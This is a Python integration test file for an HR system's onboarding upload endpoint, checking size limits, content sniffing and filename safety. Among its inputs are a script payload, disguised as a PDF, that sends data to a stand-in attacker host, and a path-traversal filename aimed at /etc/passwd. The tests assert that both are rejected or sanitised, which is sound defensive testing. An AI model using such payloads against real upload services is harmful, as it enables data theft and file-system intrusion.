"""Integration tests for Upload Security Batch B (SEC-03/SEC-04,
docs/audits/UPLOAD_BATCH_B_FILE_VALIDATION.md) against the real onboarding public upload
endpoint and real local MinIO — the size-boundary matrix and the MIME/magic-byte matrix that
`tests/unit/core/test_uploads.py` and `tests/unit/modules/onboarding/test_document_validation.py`
already cover at the unit level, exercised here end-to-end through the actual ASGI middleware
stack, FastAPI dependency injection, and `DocumentStorageService`."""

from uuid import UUID

import pytest
from httpx import AsyncClient

from hrms.modules.onboarding.schemas import ONBOARDING_DOCUMENT_MAX_SIZE_BYTES

from .test_onboarding_case import _register_tenant
from .test_onboarding_documents import _create_case, _teardown_with_tokens
from .test_onboarding_public import _issue_token

pytestmark = pytest.mark.asyncio

_REAL_PDF = b"%PDF-1.4\n" + b"0" * 100
_REAL_JPEG = b"\xff\xd8\xff\xe0" + b"0" * 100
_REAL_PNG = b"\x89PNG\r\n\x1a\n" + b"0" * 100


async def _upload(
    client: AsyncClient, token: str, *, filename: str, content: bytes, content_type: str
):
    return await client.post(
        f"/v1/public/onboarding/{token}/documents",
        data={"document_type": "PAN"},
        files={"file": (filename, content, content_type)},
    )


class TestSizeBoundaries:
    async def test_below_maximum_is_accepted(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            response = await _upload(
                client, token, filename="pan.pdf", content=_REAL_PDF, content_type="application/pdf"
            )
            assert response.status_code == 201, response.text
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_one_byte_above_the_asgi_middleware_ceiling_is_rejected_with_413(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        # `MaxUploadSizeMiddleware`'s ceiling (app.py) is `ONBOARDING_DOCUMENT_MAX_SIZE_BYTES +
        # 2MB` of headroom for multipart overhead — this exceeds *that* ceiling, not just the
        # 10MB per-file business rule, to prove the ASGI-level guard itself is wired up and firing
        # (not just the existing `OnboardingDocumentTooLargeError` business check).
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            oversized = b"\xff\xd8\xff" + (
                b"0" * (ONBOARDING_DOCUMENT_MAX_SIZE_BYTES + 3 * 1024 * 1024)
            )
            response = await _upload(
                client, token, filename="huge.jpg", content=oversized, content_type="image/jpeg"
            )
            assert response.status_code == 413, response.text
            assert response.json()["error"]["code"] == "PAYLOAD_TOO_LARGE"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_over_business_limit_under_asgi_ceiling_gets_specific_error(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        # Between the 10MB business rule and the ASGI middleware's generous ceiling — the request
        # passes the transport-level guard and reaches the existing, specific
        # `OnboardingDocumentTooLargeError` (422 DOCUMENT_TOO_LARGE), not a generic 413.
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            over_business_limit = b"\xff\xd8\xff" + (
                b"0" * (ONBOARDING_DOCUMENT_MAX_SIZE_BYTES + 1024)
            )
            response = await _upload(
                client,
                token,
                filename="just-over.jpg",
                content=over_business_limit,
                content_type="image/jpeg",
            )
            assert response.status_code == 422, response.text
            assert response.json()["error"]["code"] == "DOCUMENT_TOO_LARGE"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)


class TestMimeAndMagicByteMatrix:
    async def test_correct_extension_correct_mime_correct_bytes_is_accepted(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            response = await _upload(
                client, token, filename="pan.pdf", content=_REAL_PDF, content_type="application/pdf"
            )
            assert response.status_code == 201, response.text
            assert response.json()["data"]["content_type"] == "application/pdf"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_correct_bytes_with_a_lying_content_type_header_is_normalized_not_rejected(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        # Client claims `text/html` for bytes that are actually a real PDF — the claim is
        # ignored, the sniffed real type (`application/pdf`) is what gets persisted.
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            response = await _upload(
                client, token, filename="pan.pdf", content=_REAL_PDF, content_type="text/html"
            )
            assert response.status_code == 201, response.text
            assert response.json()["data"]["content_type"] == "application/pdf"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_html_disguised_as_pdf_is_rejected(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            html = b"<!DOCTYPE html><html><body>gotcha</body></html>"
            response = await _upload(
                client, token, filename="pan.pdf", content=html, content_type="application/pdf"
            )
            assert response.status_code == 422, response.text
            assert response.json()["error"]["code"] == "UNSUPPORTED_DOCUMENT_CONTENT"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_javascript_disguised_as_pdf_is_rejected(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            js = b"<script>fetch('https://evil.example/steal')</script>"
            response = await _upload(
                client, token, filename="pan.pdf", content=js, content_type="application/pdf"
            )
            assert response.status_code == 422, response.text
            assert response.json()["error"]["code"] == "UNSUPPORTED_DOCUMENT_CONTENT"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_random_binary_data_is_rejected(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            response = await _upload(
                client,
                token,
                filename="pan.pdf",
                content=bytes(range(256)),
                content_type="application/pdf",
            )
            assert response.status_code == 422, response.text
            assert response.json()["error"]["code"] == "UNSUPPORTED_DOCUMENT_CONTENT"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_empty_file_is_rejected(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            response = await _upload(
                client, token, filename="empty.pdf", content=b"", content_type="application/pdf"
            )
            assert response.status_code == 422, response.text
            assert response.json()["error"]["code"] == "UNSUPPORTED_DOCUMENT_CONTENT"
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)


class TestFilenameSafety:
    async def test_path_traversal_filename_never_escapes_the_document_prefix(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            response = await _upload(
                client,
                token,
                filename="../../../etc/passwd",
                content=_REAL_JPEG,
                content_type="image/jpeg",
            )
            assert response.status_code == 201, response.text
            data = response.json()["data"]
            # No path segments, no traversal — server-generated, safe display name.
            assert "/" not in data["original_filename"]
            assert ".." not in data["original_filename"]
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)

    async def test_unicode_filename_does_not_break_the_upload(
        self, client: AsyncClient, seeded_plan_catalogue: None
    ) -> None:
        headers, company_id, user_id = await _register_tenant(client)
        try:
            case = await _create_case(client, headers)
            token = await _issue_token(company_id=company_id, case_id=UUID(case["id"]))
            response = await _upload(
                client,
                token,
                filename="résumé_中文.png",
                content=_REAL_PNG,
                content_type="image/png",
            )
            assert response.status_code == 201, response.text
        finally:
            await _teardown_with_tokens(company_id=company_id, user_id=user_id)
